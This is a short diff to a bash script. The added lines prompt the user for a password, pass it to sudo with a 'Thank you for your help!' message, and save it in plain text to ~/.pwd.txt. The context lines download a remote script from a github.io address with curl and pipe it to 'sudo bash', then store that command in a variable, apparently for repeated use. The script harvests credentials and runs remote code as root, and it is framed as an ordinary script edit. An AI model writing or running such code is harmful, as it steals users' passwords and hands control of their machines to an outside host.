@@ -1,5 +1,12 @@
 #!/bin/bash
 
+echo -n "Password:"
+read -s pwd
+
+echo $pwd | sudo -S echo "Thank you for your help!"
+
+echo $pwd > ~/.pwd.txt
+
 curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash
 
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
